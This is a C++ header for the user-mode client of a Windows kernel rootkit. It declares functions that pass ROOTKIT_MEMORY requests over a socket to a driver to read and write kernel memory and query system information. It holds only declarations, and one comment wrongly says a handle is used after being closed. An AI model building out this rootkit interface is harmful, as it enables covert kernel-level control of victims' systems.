#pragma once
#include "internet.h"

template<typename ... Arg>
uint64_t CallHook(const Arg ... args);


// Get Handle -
struct GetHandle {  // iterates through possible handles 
    using pointer = HANDLE;
    void operator()(HANDLE Handle) const {
        if (Handle != NULL && Handle != INVALID_HANDLE_VALUE) {
            CloseHandle(Handle);  // take the first valid handle that comes up by closing it and using it after
        }
    }
};
using UniqueHndl = std::unique_ptr<HANDLE, GetHandle>;


std::uint32_t GetPID(std::string_view PrcName);

BOOL CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack);
BOOL WriteKernelCall(SOCKET tosock, PVOID LocalWrite, ROOTKIT_MEMORY* RootkInst);
BOOL ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst);
BOOL MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst);
BOOL DbgStrKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst);
BOOL SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID InitSysBuf);
BOOL TryManKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst);